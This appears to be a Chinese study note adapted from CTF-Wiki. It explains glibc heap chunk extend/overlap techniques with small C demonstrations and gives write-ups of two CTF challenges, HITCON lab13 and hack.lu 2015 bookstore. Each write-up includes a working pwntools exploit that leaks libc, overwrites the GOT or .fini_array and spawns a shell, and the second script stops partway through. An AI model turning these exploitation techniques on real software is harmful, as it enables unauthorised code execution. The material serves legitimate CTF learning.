# 堆拓展&溢出

> 绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录

## 介绍 

chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：

- 程序中存在基于堆的漏洞
- 漏洞可以控制 chunk header 中的数据

## 原理

chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。

在 ptmalloc 中，**获取 chunk 块大小**的操作如下

```c
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)->mchunk_size)
```

一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。

在 ptmalloc 中，**获取下一 chunk 块地址**的操作如下

```c
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
```

即使用当前块指针加上当前块大小。

在 ptmalloc 中，**获取前一个 chunk 信息**的操作如下

```c
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
```

即通过 malloc_chunk->prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。

在 ptmalloc，**判断当前 chunk 是否是 use 状态**的操作如下：

```c
#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
```

即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。

更多的操作详见 `堆相关数据结构` 一节。

通过上面几个宏可以看出，*ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位*。简而言之，**chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的**。

与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。

> **以下示例代码，谨慎加入 printf 等函数，因为程序没有初始化缓冲区，如果引入这些函数的话，程序会创建一个堆用作缓存**

## 基本示例 1：对 inuse 的 fastbin 进行 extend

简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 **注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节**。

```c
int main(void)
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第一个0x10的chunk
    malloc(0x10);//分配第二个0x10的chunk

    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域

    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    return 0;
}
```

当两个 malloc 语句执行之后，堆的内存分布如下

```shell
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk 2
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 <=== top chunk
```

之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。

```shell
0x602000:   0x0000000000000000  0x0000000000000041 <=== 篡改大小
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 
```

执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。

```shell
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```

之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。

```c
call   0x400450 <malloc@plt>
mov    QWORD PTR [rbp-0x8], rax

rax = 0x602010
```

### 注解

因为 fastbin 追求效率，安全校验机制弱，free 时找到 fastbin 链表中对应大小链表就放入了。prev_inuse 等不会校验。物理地址相邻的空闲 fastbin 不会合并。

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-01-jG6JPvPb6JSupFko.png)[^1]

[^1]: fastbin 不与物理地址相邻 fastbin 合并，不与 top chunk 合并

## 基本示例 2：对 inuse 的 smallbin 进行 extend

通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）

```c
int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
    malloc(0x10); //分配第二个 0x10 的chunk2
    malloc(0x10); //防止与top chunk合并的chunk3

    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}
```

在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。

```
0x602000:   0x0000000000000000  0x00000000000000b1 <===chunk1 篡改size域
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000021 <=== 防止合并的chunk
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk
```

释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin ，chunk3 prev_size 写入 0xb0 ，prev_inuse 为 0 ：

```
0x602000:   0x0000000000000000  0x00000000000000b1 <=== 被放入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x00000000000000b0  0x0000000000000020 <=== 注意此处标记为空
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
```

再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容

```shell
     0x4005b0 <main+74>        call   0x400450 <malloc@plt>
 →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax

     rax : 0x0000000000602010
```

## 基本示例 3：对 free 的 smallbin 进行 extend

示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。

```c
int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个0x80的chunk1
    malloc(0x10);//分配第二个0x10的chunk2

    free(ptr);//首先进行释放，使得chunk1进入unsorted bin

    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
}
```

两次 malloc 之后的结果如下

```
0x602000:   0x0000000000000000  0x0000000000000091 <=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk 2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51
```

我们首先释放 chunk1 使它进入 unsorted bin 中

```
     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:   0x0000000000000000  0x0000000000000091 <=== 进入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000090  0x0000000000000020 <=== chunk 2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51 <=== top chunk
```

然后篡改 chunk1 的 size 域

```
0x602000:   0x0000000000000000  0x00000000000000b1 <=== size域被篡改
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000090  0x0000000000000020
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51
```

此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。[^2]

[^2]: 分配的安全检查机制，请看 malloc 函数介绍

## Chunk Extend/Shrink 可以做什么 

一般来说，这种技术并不能直接控制程序的执行流程，但是**可以控制 chunk 中的内容**。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。

此外**通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用**。

## 基本示例 4：通过 extend 后向 overlapping

这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。

```c
int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第1个 0x80 的chunk1
    malloc(0x10); //分配第2个 0x10 的chunk2
    malloc(0x10); //分配第3个 0x10 的chunk3
    malloc(0x10); //分配第4个 0x10 的chunk4    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
```

初始化分配 4 个堆之后：

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170104.png)

将第一个 chunk size 修改为 0x61 ，然后 free 第一个堆块，红框内的都会被当做一个整体放入到 fastbin 当中：

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170205.png)

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170307.png)

那么当再次分配大小为 0x50 （不含chunk header）时，就会调用这块内存了：

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801171023.png)



在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。

## 基本示例 5：通过 extend 前向 overlapping

这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面（低地址）的块

```c
int main(void)
{
    void *ptr1,*ptr2,*ptr3,*ptr4;
    ptr1=malloc(128);//smallbin1
    ptr2=malloc(0x10);//fastbin1
    ptr3=malloc(0x10);//fastbin2
    ptr4=malloc(128);//smallbin2
    malloc(0x10);//防止与top合并
    free(ptr1);
    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域，prev_inuse
    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域，prev_size
    free(ptr4);//unlink进行前向extend
    malloc(0x150);//占位块

}
```

这里例子调试一直出不来堆信息，就文字描述一下：（大佬笔记：https://bbs.pediy.com/thread-260316.htm）

先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。

修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲），绕过 prev_

修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 。释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。

**前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。**

## HITCON Trainging lab13

[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13)

### 基本信息 

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护，还有一点就是 ``RELRO:    Partial RELRO`` GOT 表可以修改。

### 基本功能

程序是一个堆管理器，有增删查改功能。

每个 content 堆块用一个 0x10 的结构体堆去维护，结构体如下：

```c
struct chunk{
    size_t size;		//context 大小
    _QWORD *chunk;		//context 指针
}
```

### 漏洞函数

edit 、 show 功能都存在 off-by-one ，两者出现逻辑、地方一致，造成影响的 edit ，这里就以 edit 叙述。

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-02-7XoD5kSKWk9XAaVb.png)

可以看到 19 行写入数据的时候传入的长度参数被故意加 1 了，造成溢出可控的一字节。

### 思路

1. 利用 off-by-one 覆盖下一个 chunk 的 size （这里修改的是结构体 chunk ），伪造 chunk 大小
2. 释放被溢出 chunk 后，申请伪造 chunk ，造成 chunk overlap（堆重叠），从而控制新结构体的指针。

先布置好内存空间：

```python
create(0x18,'a'*0x10)#0
create(0x10,'b'*0x10)#1
```

chunk0 content 大小要求是用到下一个 chunk 的 prev_size 用于溢出修改下一个 chunk 的 size 。

chunk1 content 大小最好是 0x10 ，这样我们溢出修改、释放 chunk1 后再申请一个 chunk 结构体就会用这个 chunk1 content 空间（为什么不用原来的？[小结](# 小结)）。当然也可以用其他大小，自行调试即可。这里举一个例子：chunk1 content size 0x30 ，溢出修改结构体 size 为：0x71 。

堆结构如下：

```
pwndbg> x /20gx 0xac4000
0xac4000:	0x0000000000000000	0x0000000000000021
0xac4010:	0x0000000000000018	0x0000000000ac4030
0xac4020:	0x0000000000000000	0x0000000000000021
0xac4030:	0x6161616161616161	0x6161616161616161
0xac4040:	0x0000000000000000	0x0000000000000021
0xac4050:	0x0000000000000010	0x0000000000ac4070
0xac4060:	0x0000000000000000	0x0000000000000021
0xac4070:	0x6262626262626262	0x6262626262626262
0xac4080:	0x0000000000000000	0x0000000000020f81
0xac4090:	0x0000000000000000	0x0000000000000000
```

然后修改 chunk0 溢出修改下一个 chunk size，这里把 ``/bin/sh\x00`` 也一起写入：

```python
edit(0,"/bin/sh\x00".ljust(0x18,'a') + "\x41")
```

修改后 chunk1 结构体就将 chunk1 content 也包含进来了，释放的时候会放入 0x40 的 fastbin 中。

堆结构如下：

```
pwndbg> x /20gx 0xac4000
0xac4000:	0x0000000000000000	0x0000000000000021
0xac4010:	0x0000000000000018	0x0000000000ac4030
0xac4020:	0x0000000000000000	0x0000000000000021
0xac4030:	0x0068732f6e69622f	0x6161616161616161
0xac4040:	0x6161616161616161	0x0000000000000041	//chunk1 struct
0xac4050:	0x0000000000000010	0x0000000000ac4070
0xac4060:	0x0000000000000000	0x0000000000000021	//chunk1 content
0xac4070:	0x6262626262626262	0x6262626262626262
0xac4080:	0x0000000000000000	0x0000000000020f81
0xac4090:	0x0000000000000000	0x0000000000000000
```

释放 chunk1

```python
free(1)
```

```
pwndbg> bin
fastbins
0x20: 0xac4060 ◂— 0x0		//chunk1 content
0x30: 0x0
0x40: 0xac4040 ◂— 0x0		//chunk1 struct
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

将这两个空闲堆申请出来，由于 malloc 机制，申请相同大小的 chunk 才会用 fastbin 中空闲内存。0x20 会用作新 chunk 的结构体，0x40 会用作新 chunk 的 content 。

```python
create(0x30,'a'*0x18+p64(0x21)+p64(0x30)+p64(free_got))
```

这里为了方便用 chunk1' 表示新申请的堆，实际上这个堆序号还是 1 ，堆结构如下：

```
pwndbg> x /20gx 0xac4000
0xac4000:	0x0000000000000000	0x0000000000000021
0xac4010:	0x0000000000000018	0x0000000000ac4030
0xac4020:	0x0000000000000000	0x0000000000000021
0xac4030:	0x0068732f6e69622f	0x6161616161616161
0xac4040:	0x6161616161616161	0x0000000000000041	//chunk1' content
0xac4050:	0x6161616161616161	0x6161616161616161
0xac4060:	0x6161616161616161	0x0000000000000021	//chunk1' struct
0xac4070:	0x0000000000000030	0x0000000000602018
0xac4080:	0x0000000000000000	0x0000000000020f81
0xac4090:	0x0000000000000000	0x0000000000000000
```

然后就是泄露 libc 地址，修改 GOT 表，最后触发 ``system('/bin/sh')``

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : heapcreator.py
from pwn import *
context.log_level = 'debug'
p = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,context):
	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("Heap : ")
	p.sendline(str(size))
	p.recvuntil("heap:")
	p.send(context)
def edit(id,context):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(id))
	p.recvuntil("heap :")
	p.send(context)
def show(id):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(id))
def free(id):
	p.recvuntil("choice :")
	p.sendline("4")
	p.recvuntil("Index :")
	p.sendline(str(id))
def exit():
	p.recvuntil("choice :")
	p.sendline("5")

# off-by-one
create(0x18,'a'*0x10)#0
create(0x10,'b'*0x10)#1
edit(0,"/bin/sh\x00".ljust(0x18,'a') + "\x41")
free(1)

# leak libc
free_got = elf.got['free']
create(0x30,'a'*0x18+p64(0x21)+p64(0x30)+p64(free_got))
show(1)
p.recvuntil("Content : ")

free_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("free_addr:"+hex(free_addr))
libc_base = free_addr - libc.symbols['free']
log.info("libc_base:"+hex(libc_base))
system = libc_base + libc.symbols['system']
log.info("system:"+hex(system))

edit(1,p64(system))
#gdb.attach(p)
free(0)

p.interactive()
```

### 小结

* 分配大小在 fastbin 范围内的新堆块，需要大小匹配用 fastbin 的空闲堆块。举个例子：fastbin 中有一个 0x20 的空闲堆块，需要分配一个 0x40 堆块，会从 topchunk 中分割 0x40 出来（如果可以）。

## 2015 hacklu bookstore

[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore)

### 基本信息

64 位动态链接的程序。

```
books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped

Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### 基本功能

程序是一个买书的系统，最多只能购买两本书。每一本书都用一个独立的堆去维护，这个堆是程序自行申请的，不能人工干预的，固定大小为 0x80 。

可以新增、删除书籍，最后提交是会将两本书（两个堆）信息合并到一个新的堆中，然后进行输出。

### 漏洞函数

#### 堆溢出

录入书籍信息用一个自定义输入函数，这个函数存在一个堆溢出的问题。结束输入的判断标准是遇到 \n ，需要注意的是自定义输入函数会在输入字符串最后加上一个 \x00 ：

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-03-UeGvjNWMx6CKidQp.png)

#### UAF

程序的删除函数只是将堆释放，并没有将指针置零：

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-03-hPFo7mUDVdOY9rRM.png)

#### 格式化字符串

程序退出打印信息时，会出现一个格式化字符串漏洞：

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-03-3RqbLskHDRReG7NX.png)

#### 奇怪的输入长度

菜单选择输入长度上限为 0x80 ，这里不算是一个漏洞，但是会在后面利用当中运用到。

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-S4UbIBlARivRMmeo.png)

### 思路

> 这条题目利用起来比较复杂，涉及到堆溢出、堆重叠、格式化字符串、劫持 fini_array 。下面先写出大致步骤

1. free book2
2. 利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，劫持 fini_array 、泄露地址
3. 第二轮运行程序： free book2
4. 利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，修改返回地址为 one_gadget

产生这种解题思路思考方向：先着眼简单、已经学过熟悉的漏洞，也就是格式化字符串这个漏洞。利用格式化字符串的话，就是修改 got 表或者返回地址等控制程序流程 getshell 。

1. 这里 格式化字符串 出现在最后一个 printf ，也就是输出完成之后程序就会退出。
2. 格式化字符串的内容是从 submit  申请的 dest 中读取的。
3. 用户无法自行分配堆，只能从程序本身申请的 3 块堆和 submit 功能设法利用。

#### 控制格式化字符串内容

先来解决格式化字符串内容的问题。内容是从 dest 中读取的，就要设法控制 dest  内容。这里利用的是 overlapping 堆重叠，将 chunk2 和 chunk3 重叠起来，利用 submit 复制功能溢出控制 dest 中的内容。

造成 overlapping 先 free chunk2 ，再通过写入 book1 功能溢出修改 chunk2 的 size 字段为 0x151 。这样当 submit 功能申请 0x140 堆块（不含chunk header）的时候就会去到 unsortedbin 中找到被我们修改大小为 0x151 的 chunk2 。

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-1f1IV0WHxcpMxOvo.png)

submit 功能正常情况下复制的内容是这样的：

```
"Order 1: " + book1 + "\nOrder 2: " + book2 + '\n'
```

但是我们将 chunk2 chunk3 重叠在一起，且 chunk header 是同一地址。简单点就是两个堆开始地址相同，结束地址不同。

chunk1 chunk2 地址指针运行过程中没有被二次赋值，一直保存着申请堆时的地址。（free chunk2 时因为有 UAF 漏洞，所以没被重置。）造成的影响就是 chunk2 的内容 submit 的时候被写为 ``"Order 1: " + book1 ``，详细过程如下：

1. submit 处理 chunk1 信息，向 chunk3（即chunk2）写入：

   ```
   "Order 1: " + book1
   ```

2. submit 处理 chunk2 信息，向 chunk3（即chunk2）写入：

   ```
   "\nOrder 2: " + "Order 1: " + book1 + '\n'
   ```

先看看 chunk1、chunk2（chunk3）、dest 三个堆的分布情况：

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-waueydoBLLdD7QWO.png)

我们控制 chunk1 内容，写入有效 payload 和 padding ，将有效 payload 溢出写入到 dest （fd 指针处开始）。换句话就是我们希望图上 0xef3010 开始写入的内容，复制到 0xef3130 。可以得出计算公式：（"" 不算个数）

```
# 需要在复制第二个chunk1前，填充好0x90字节，也就是chunk2(3) fd开始到dest fd开始的距离，这样chunk1就会被复制到dest fd开始
"Order 1:" + chunk1 + "\n" + "Order 2:" + "Order 1:" == 0x90
# 化简为
chunk1 == 0x90 - 28 == 0x74
```

得出结论：将有效 payload 写在 chunk1 开头，然后将 chunk1 用非 \x00 填充长度为 0x74 ，当submit 的时候，有效 payload 就会放在 dest 的 fd 。这样就获得一个任意读写的格式化字符串，需要利用格式化字符串泄露、修改提前在修改 chunk1 时写入即可。

目前得出 payload ：

```python
payload1 = 'b'*8	#格式化字符串
payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
payload1 += p64(0x151)	
edit(1,payload1)
```

#### 劫持 fini_array

格式化字符串内容已经设法控制了，但是 getshell 需要两次使用这个漏洞，一次泄露地址，一次修改地址。

这里就需要用到一个知识，main 函数是二弟，他有大哥，有三弟。程序开始先运行一次大哥，在运行 main ，最后运行三弟。三弟当做有个数组：``.fini_array`` 。程序退出后会执行 ``.fini_array`` 地址出的函数，不过只能利用一次（动态链接程序）。

所以我们可以在格式化字符串的第一轮泄露地址的同时，修改 .fini_array 的地址为 main 函数地址，让程序重新运行一次。main 函数地址易知，关键是 .fini_array 地址怎么找。

> 动态链接与静态链接查找和利用有差别，为了篇幅将两者区别放在最后。对 64 位静态程序劫持 fini_array 有兴趣可以看看：[劫持 64 位 fini_array 进行 ROP 攻击](https://www.mrskye.cn/archives/173/)

##### Way 1

IDA 中 ``Ctrl+S`` 查找 .fini_array 地址，可以看到这个数组空间大小为 8 字节，只能放一个地址，这是与静态程序的一个区别（静态有两个地址）。

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png)

   

##### Way 2

用 gdb 调试程序，输入 ``elf`` 查找 .fini_array 

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png)

要素具备但是遇到一个问题，格式化字符串的内容是存放在堆上，栈上面只有该堆的指针而已。类似题目：ctf-wiki 的[堆上的格式化字符串漏洞](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh/#_22) 。

这道题目我们不搞栈迁移到堆上面，而是利用菜单的奇怪输入长度，将地址写入到栈上。

```python
# 为了对齐前面填充8字节用来放菜单选项，fini_array偏移为13
# 泄露libc可以用__libc_start_main也可以和我一样自己往栈上写一个
payload2 = '5'*8 + p64(fini_array) + p64(free_got)
p.recvuntil("5: Submit\n")
p.sendline(payload2)
```

泄露 libc 地址和劫持 fini_array payload 目前构造：

```python
payload1 = "%2617c%13$hn" + '|' + "%14$s"
payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
payload1 += p64(0x151)		
edit(1,payload1)
```

#### 修改 main 函数返回地址

到这里我们就获取了 libc_base 地址并且进入了第二次的 main 函数。下一步就是如何利用了。

就 free got 表改为 onegadget ？在这里不行，因为修改玩之后需要触发，也就是再一次进入 main 函数触发 free 函数。第二次进入 main 函数实际上是在 \_\_libc_csu_fini 这个退出函数中调用 fini_array 数组中存储的函数（main），当执行完 main ，就会继续完成退出函数，然后正常退出程序。

这里有两个思路：

1. 同第一次 mian 中，泄露出栈地址，通过调试获取到第二次 main 的返回地址与泄露栈地址的偏移，就可以获取到 main rip 的栈地址，我们对此进行修改。
2. 修改退出函数当中某个函数的 got 表，当完成退出函数调用这个函数就会 getshell。

第二种思路是有几次比赛出现过这种利用方法，但没有在这道题目上尝试，主要是太费劲了。这道题就用第一种方法，就是需要我们泄露出 栈地址 ，然后因为栈结构固定，所以通过偏移算出第二 main 函数的返回地址。

通过调试查看第一个 main 函数的栈空间结构体：

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-7YehpeGp46LWyAuO.png)

 在格式化字符串的时候把这个地址也泄露出来：

```python
payload1 = "%2617c%13$hn" + '|' + "%14$s" + '-' + "%24$p"
payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
payload1 += p64(0x151)		
edit(1,payload1)
```

再次通过调试找到第二次 main 函数返回地址，然后计算固定偏移：

```python
0x7ffea45d8980-0x7ffea45d887a=0x106
```

所以得出计算公式：

```python
# ret_addr 为泄露地址
attack_addr = ret_addr - 0x106
```

第二次进入 main 函数的利用思路就出来了，和第一次进入一样，先释放 chunk2 造成 overlapping 堆重叠，控制 dest 内容从而控制格式化字符串内容。利用格式化字符串修改第二次 main 函数的返回地址为 onegadget 。

### exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : books.py
from pwn import *
context.log_level = 'debug'
p = process("./books")
elf = ELF("./books")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def command(cmd):
    p.recvuntil("5: Submit\n")
    p.sendline(str(cmd))
def edit(cmd,content):
    command(cmd)
    p.recvuntil("order:\n")
    p.sendline(content)
def free(cmd):
    command(cmd+2)

free_got = elf.got['free']
fini_array = 0x6011B8
main_addr = 0x400A39

# ====round1====
# free book2 放入 unsortedbin 
free(2)
# 修改 fini_array 为 main
# 泄露 libc_base
# 泄露 stack 地址
payload1 = "%2617c%13$hn" + '|' + "%14$s" + '-' + "%24$p"
payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
payload1 += p64(0x151)      
edit(1,payload1)            

# 从菜单选项将fini_array和free_got写入到栈上
payload2 = '5'*8 + p64(fini_array) + p64(free_got)
p.recvuntil("5: Submit\n")
p.sendline(payload2)
p.recvuntil("|")
p.recvuntil("|")
p.recvuntil("|")

# 处理libc地址
free_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("free_addr:"+hex(free_addr))
libc_base = free_addr - libc.symbols['free']
log.info("libc_base:"+hex(libc_base))
onegadget = libc_base + 0x45226 
log.info("onegadget:"+hex(onegadget))

# 处理栈地址
p.recvuntil("-")
ret_addr = int(p.recv(14),16)
log.info("ret_addr:"+hex(ret_addr))
attack_addr = ret_addr - 0x106
log.info("attack_addr:"+hex(attack_addr))

# ====round2====

# 同 round1
